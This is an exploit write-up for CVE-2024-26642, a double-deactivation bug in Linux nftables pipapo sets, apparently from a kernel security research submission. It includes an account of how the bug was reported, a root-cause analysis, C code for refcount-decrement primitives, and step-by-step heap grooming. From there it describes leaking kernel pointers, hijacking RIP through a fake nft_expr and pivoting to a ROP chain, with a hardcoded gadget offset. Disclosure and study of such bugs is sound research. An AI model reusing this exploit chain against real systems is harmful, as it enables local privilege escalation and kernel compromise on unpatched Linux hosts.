# Exploit detail about CVE-2024-26642
If you want to get some base information about CVE-2024-26642, please read [vulnerability.md](./vulnerability.md) first.

## Background
nftables is a netfilter project that aims to replace the existing {ip,ip6,arp,eb}tables framework, providing a new packet filtering framework for {ip,ip6}tables, a new userspace utility (nft) and A compatibility layer. It uses existing hooks, link tracking system, user space queuing component and netfilter logging subsystem.

It consists of three main components: kernel implementation, libnl netlink communication and nftables user space front-end. The kernel provides a netlink configuration interface and runtime rule set evaluation. libnl contains basic functions for communicating with the kernel. The nftables front end is for user interaction through nft.

nftables implements data packet filtering by using some components like `table`, `set`, `chain`, `rule`.

## Some additional stories
After reading `vulnerability.md` or `cause analysis`, you may wonder why the root cause and patch do not seem to match. I can only talk about the vulnerability reporting process for this question.
I sent a vulnerability report to security@kernel.org at 2024.2.29 13:33: 
``` 
Hi, I've found a new vulnerability in Linux netfilter/nftable subsystem. In the function nf_tables_deactivate_set, it does not set "set->dead = 1". This makes it possible to call nft_setelem_data_deactivate with a set element more than once by following this step: 
1. Create a pipapo set with flag NFT_SET_TIMEOUT and NFT_SET_ANONYMOUS. 
2. Create a set element of this pipapo set with flag NFTA_SET_ELEM_EXPIRATION. 
3. Create a chain. 
4. Create a rule with nft_lookup expr, which will bind the pipapo set we create in step 1. 
5. Delete the chain And finally nft_setelem_data_deactivate will be called for the same set element both in nft_map_deactivate and in function pipapo_gc.

Attachment is the poc I wrote for this vulnerability, which leaks some kernel pointers. I tested it on linux 6.1.78.

Thanks,
lonial con
```
The email also attached a poc I wrote based on the trigger idea (it can cause the latest kernel at that time to produce crahs). I did not receive any reply emails afterwards.
On 2024.3.5, I noticed that the maintainer of netfilter pushed a patch to netfilter (https://patchwork.ozlabs.org/project/netfilter-devel/patch/20240301022605.146412-1-pablo@netfilter.org/). He pushed the corresponding patch without asking for any opinion from me.

The patch did make my poc not work, but this patch did not fix the core of the problem `set->dead = 1`. Therefore, I added two patch commits to `vulnerability.md`.

## Cause anaylysis

In the function nf_tables_deactivate_set, it does not set "set->dead = 1". This makes it possible to call nft_setelem_data_deactivate with a set element more than once by following this step:

1. Create a pipapo set with flag NFT_SET_TIMEOUT and NFT_SET_ANONYMOUS.
2. Create a set element of this pipapo set with flag NFTA_SET_ELEM_EXPIRATION.
3. Create a chain.
4. Create a rule with nft_lookup expr, which will bind the pipapo set we create in step 1.
5. Delete the chain

After you send these commands in a message list, when you reach step 5 `delete the chain`, the following call chain will occur:
```
nf_tables_delchain -> nft_delrule -> nft_rule_expr_deactivate -> (expr->ops->deactivate) -> nft_lookup_deactivate -> nf_tables_deactivate_set -> case NFT_TRANS_PREPARE: nft_map_deactivate
```
`nft_map_deactivate` will eventually call `nft_setelem_data_deactivate` for all set elements in the set.

But at the same time, after all commands are executed, nftable will also call `nf_tables_commit`, which triggers another call chain:

```
nf_tables_commit -> (set->ops->commit) -> nft_pipapo_commit -> pipapo_gc -> nft_pipapo_gc_deactivate -> nft_setelem_data_deactivate
```

Finally, `nft_setelem_data_deactivate` will be called for elements which are timed out in the pipapo set, which may result in multiple calls to `nft_setelem_data_deactivate` for the same set element.

## Triggering the vulnerability

It's easy to trigger it by following this steps:

- Create a pipapo set with flag NFT_SET_TIMEOUT and NFT_SET_ANONYMOUS.
- Create a set element of this pipapo set with flag NFTA_SET_ELEM_EXPIRATION.
- Create a chain.
- Create a rule with nft_lookup expr, which will bind the pipapo set we create in step 1.
- Delete the chain 


## Exploit it
The method of exploiting CVE-2024-26642 is exactly the same as that of exploiting CVE-2023-6817. If you want to learn how I exploit CVE-2023-6817, please read [here](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-6817_lts_cos/docs/exploit.md).The only difference is how to construct the two primitives. 

## Primitive
### Primitive_0
I build a function named as `primitive_0` to change the nft_object->use by triggering the vulnerabiltiy:

```c
//make target_obj->use = target_obj->use - repeat_time
void primitive_0(struct nl_sock *socket, char *table, char *target_obj, int repeat_time){
    char *pad = malloc(0x100);
    memset(pad,0x41,0x100);
    int i,j;
    struct nlmsghdr **msg_list = malloc(sizeof(struct nlmsghdr *)*0x100);
    char *key = malloc(0x40);
    char *set_name = "set for primitive0";
    char *chain_name = "chain for primitive0";
    msg_list[0] = new_set_pipapo_for_timeout_with_anonymous_msg(table, set_name, NFT_OBJECT_CT_EXPECT);
    for(i=0;i<repeat_time;i++){
        *(uint64_t *)key = i;
        msg_list[i+1] = new_setelem_with_expiration_msg(table, set_name, pad, 0xc0, target_obj, key, 0x40, NULL, 0, 0,0x0100000000000000);
    }
    msg_list[repeat_time+1] = new_chain_msg(table, chain_name, 0);
    msg_list[repeat_time+2] = new_rule_lookup_for_chain_msg(table, chain_name, set_name, 0);
    msg_list[repeat_time+3] = del_chain_msg(table, chain_name);
    send_msg_list(socket, msg_list, repeat_time+4);

    free(msg_list);
    free(pad);
}
```


How it works:
1. message 0: Create a pipapo set with flags `NFT_SET_TIMEOUT` and `NFT_SET_ANONYMOUS`
2. message from 1 to (repeat_time): Create repeat_time set elements, all of which contain `NFTA_SET_ELEM_EXPIRATION` and `NFTA_SET_ELEM_TIMEOUT`.
3. message repeat_time+1: Create a chain
4. message repeat_time+2: Create a rule on the chain, which contains an expr of type `lookup`. `lookup` expr can be bound to an `nft_set` when initialized, and we let it bind the pipapo set created by message[0].
5. message repeate_time+3: delete the chain created by message repeat_time+1
When the above message is sent, two rounds of calls to `nft_setelem_data_deactivate` for the same set element will be triggered:
    
The first round is when executing message repeate_time+3, and the following call path will be generated in the end:

```c
nf_tables_delchain -> nft_delrule -> nft_rule_expr_deactivate -> (expr->ops->deactivate) -> nft_lookup_deactivate -> nf_tables_deactivate_set -> nft_map_deactivate
```

The `nft_map_deactivate` function will call `nft_mapelem_deactivate` -> `nft_setelem_data_deactivate` for all elements in the pipapo set created by message 0.

The second round is after all messages are executed, `netfilter` will call the `nf_tables_commit` function, and finally generate the calling path:
```c
nft_set_commit_update -> (set->ops->commit) -> nft_pipapo_commit -> pipapo_gc -> nft_pipapo_gc_deactivate -> nft_setelem_data_deactivate
```
The function `pipapo_gc` will also call `nft_setelem_data_deactivate` for all timeout elements in pipapo set.
(This is why it is necessary to add `set->dead = 1` in nf_tables_deactivate_set to fix the vulnerability, because after adding this line of code, the subsequent operations will not be executed in the function nft_set_commit_update.)

It will trigger the vulnerability as described above. In order to achieve the effect of executing "nft_object->use--" multiple times on the same nft_object, I created multiple set elements using the same nft_object at one time.

### Primitive_1
I build a function named as `primitive_1` to change the nft_chain->use by triggering the vulnerabiltiy:

```c
//make target_chain->use = target_chain->use - repeat_time
void primitive_1(struct nl_sock *socket, char *table, char *target_chain, int repeat_time){
    char *pad = malloc(0x100);
    memset(pad,0x41,0x100);
    int i,j;
    struct nlmsghdr **msg_list = malloc(sizeof(struct nlmsghdr *)*0x100);
    char *set_name = "set for primitive1";
    char *chain_name = "chain for primitive1";
    char *key = malloc(0x40);
    msg_list[0] = new_set_pipapo_for_timeout_and_chain_with_anonymous_msg(table, set_name, 0x40);
    for(i=0;i<repeat_time;i++){
        *(uint64_t *)key = i;
        msg_list[i+1] = new_setelem_with_chain_and_expiration_msg(table, set_name, pad, 0xc0, target_chain, key, 0x40, NULL, 0, 0,0x0100000000000000);
    }
    msg_list[repeat_time+1] = new_chain_msg(table, chain_name, 0);
    msg_list[repeat_time+2] = new_rule_lookup_for_chain_msg(table, chain_name, set_name, 1);
    msg_list[repeat_time+3] = del_chain_msg(table, chain_name);
    send_msg_list(socket, msg_list, repeat_time+4);

    free(msg_list);
    free(pad);
}
```
It will trigger the vulnerability as described above. In order to achieve the effect of executing "nft_chain->use--" multiple times on the same nft_object, I created multiple set elements using the same nft_chain at one time.


## Exploit
Because the exploit steps of CVE-2024-26642 is the same as CVE-2023-6817, the following content is just a copy of this [article](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-6817_lts_cos/docs/exploit.md). 


### Leak info

This part of the exploit is the almost same as CVE-2023-4569. If you want to understand more details, read this [article](https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2023-4569_lts/docs/exploit.md). 

The only difference is that when exploiting CVE-2023-4569, we put the len field of `NFT_SET_EXT_USERDATA` at offset 0x30, while in this exploit, we need to put it at offset 0x34. In this [article](https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2023-4569_lts/docs/exploit.md), I used 'NFTA_SET_ELEM_OBJREF'. In the current exploit, I used 'NFTA_SET_ELEM_DATA' to construct the corresponding setelem:
```c
//step 5
    //get heap back
    for(i=0;i<0x1000;i++){
        //printf("%d\n",i);
        *(uint64_t *)pad = i;
        hash_key = i;
        new_setelem_with_elemdata(socket, table, hash_set, pad, 0xa1, &hash_key, 8, NULL, 0,0);
    }
```
```c
void new_setelem_with_elemdata(struct nl_sock * socket,char *table_name, char *set_name, void *udata, uint32_t ulen, char * input_key, int key_len, char *key_end, int key_end_len, int if_catchall){
	...//Here I set the length of NFTA_SET_ELEM_DATA to 0x10
	nla_put(elem_data, NFTA_DATA_VALUE, 0x10, &pad0);
    nla_put_nested(elem_nest, NFTA_SET_ELEM_DATA, elem_data);
    ...
}

```


I leak some useful infomation by the following steps.

- 1. Create many objects first.(`object A`,`object B`,...,in exploit.c, it's `"obj_for_leak_0"`,`"obj_for_leak_1"`...).Their size is 0xcc and they use kmalloc-256.
- 2. Create 0xa4 set elements wihch use one of the objects created in step 1. We assume we use `object F`. Create another set element `element X` using `object F`(This set element will be used in step 10). After step2, we will set `object F->use = 0xa5`. `udata->size` must be 0xa0 because the size of the set elem created in step 5 needs to be the same as the size of the nft_object released in step 4.
- 3. Call `primitive_0` 0xa5 times, finally making `object F->use = 0`
- 4. Delete `object F`
- 5. Create many new set elements to get the heap of `object F` back. These new elements are carefully constructed so that the `len` field representing the length of `NFT_SET_EXT_USERDATA` is exactly at the position of `object F->use`. These new set elements will use `kmalloc-256`.
- 6. Delete all the set elements we created in step 2 except `element X`. Now the `setelem->udata_len = 0xfc`(The original value is `0xa1-1=0xa0`)
- 7. Dump all the collection elements created in step 5. One of the elements will leak some useful heap addresses (because we read the next obj->list via heap out-of-bounds read). Now we will get the heap addresses of "object E" and "object G" (the objects created before and after "object F")
- 8. Delete all the set elements created in step 5 to free the heap of `object F` again.
- 9. Spray memory filled with `addressof(object E)+0x80` to get the heap of `object F` back again.
- 10. Dump set element `element X` created in step 2. We can leak `object E ->ops` because we overwrite `(*nft_set_ext_obj(ext))->key` by step 9.
- 11. Delete all the `nft_object` we created in step 1 and spray ROP gadget to get all the heap back. Now we get two pointers by step 7 pointed to our ROP gadget.
  
  ```c
  static int nf_tables_fill_setelem(struct sk_buff *skb,
				  const struct nft_set *set,
				  const struct nft_set_elem *elem)
  ...
  if (nft_set_ext_exists(ext, NFT_SET_EXT_OBJREF) &&
	    nla_put_string(skb, NFTA_SET_ELEM_OBJREF,
			   (*nft_set_ext_obj(ext))->key.name) < 0)
		goto nla_put_failure;
  ...
  ```


### Control RIP
This part of the exploit is basically the same as CVE-2023-4569. If you want to understand more details, read this [article](https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2023-4569_lts/docs/exploit.md).

The only difference is that when exploiting CVE-2023-4569, we put the `size` field representing the length of `NFT_SET_EXT_EXPRESSIONS` at offset 0x30, while in this exploit, we need to put it at offset 0x50 (because we used primitive_1 in Primitive, nft_chain->use offset is 0x50). Similar to the Leak info, I chose to put the `size` field representing the length of `NFT_SET_EXT_EXPRESSIONS` at offset 0x50 by increasing `NFTA_SET_ELEM_DATA`:
```c
//step 4 create normal set elem with expr, make offsetof(chain->use) == offsetof(expr->size)
    *(uint64_t *)&pad[0] = target_heap;//expr->ops
    *(uint64_t *)&pad[8] = kernel_off + 0xFFFFFFFF8165A0A3;//leave ; ret
    for(i=0;i<0x1000;i++){
    	*(uint64_t *)hash_key_48 = i;
	new_setelem_with_expr_and_elemdata(socket, table, hash_set_for_expr, pad, 0x10, NULL, hash_key_48, 48, NULL, 0);
    }
```
```c
void new_setelem_with_expr_and_elemdata(struct nl_sock * socket,char *table_name, char *set_name, void *elemdata, uint32_t elemdata_len, char *obj_ref, char * input_key, int key_len, char *key_end, int key_end_len){
	...
	if(elemdata > 0){
        nla_put(elem_data, NFTA_DATA_VALUE, elemdata_len, elemdata);
		nla_put_nested(elem_nest, NFTA_SET_ELEM_DATA, elem_data);
    }
	...
```

I control the RIP by the following steps:
- 1. Create a chain for ROP(`chain X`). The size is 0x78 and it uses kmalloc-128.
- 2. Create 0x20 set elements wihch use `chain X` created in step 1. After step2, we will set `chain X->use = 0x20`
- 3. Call `primitive_1` 0x20 times, finally making `chain X->use = 0`
- 4. Delete `chain X`
- 5. Create 0x1000 new set elements. These new elements are carefully constructed so that the `size` field representing the length of `NFT_SET_EXT_EXPRESSIONS` is exactly at the position of `chain X->use`.
- 6. Delete all the set elements we created in step 2. The `chain->use` will be set to `0xfffffff0` from `0x10`, which means we change the `size` of `NFT_SET_EXT_EXPRESSIONS` of a set element which we created in step 5. We will change the `size` from `0x10` to `0xfffffff0`. Now we get a fake `nft_expr` expr[1]. We can fill the `ops` and the `data` of the fake expr in `NFTA_SET_ELEM_DATA`. 
- 7. Dump all the set elements we create in step 5. Finally we will jmp to our ROP gadget.
  ```c
	static int nf_tables_fill_expr_info(struct sk_buff *skb,
						const struct nft_expr *expr)
	{
		if (nla_put_string(skb, NFTA_EXPR_NAME, expr->ops->type->name))
			goto nla_put_failure;

		if (expr->ops->dump) {
			struct nlattr *data = nla_nest_start_noflag(skb,
									NFTA_EXPR_DATA);
			if (data == NULL)
				goto nla_put_failure;
			if (expr->ops->dump(skb, expr) < 0) //we hijack RIP here
				goto nla_put_failure;
			nla_nest_end(skb, data);
		}
	...

  ```
### ROP detail

The assembly code when calling expr->ops->dump is as follows:

```
	mov     rax, [rbp+0]
	mov     rsi, rbp
	mov     rdi, rbx
	mov     rax, [rax+40h]
	call    __x86_indirect_thunk_rax
```
So the `rbp` is the pointer of the current `nft_expr`, and it will be the start of `NFTA_SET_ELEM_DATA` when it comes to the fake `nft_expr`:


The first step of ROP start looks like this:
```
expr->ops->dump(skb, expr)  --> leave ; ret 
```
This will finally makes this happen:

```
rsp = element + 0x68 // mov rsp, rbp  
rbp = *(element + 0x68) //pop rbp  rbp=*(NFTA_SET_ELEM_DATA)
rsp = element + 0x70 
rip = *(element + 0x70) //ret   rip=*(NFTA_SET_ELEM_DATA + 8)
rsp = element + 0x78 
```
The second step of ROP is also:
```
leave; ret
```
After this, the `rsp` will be the value of the `NFTA_SET_ELEM_DATA[0]`. It will point to the heap, which we filled it with our ROP gadget in `Leak info` step 11.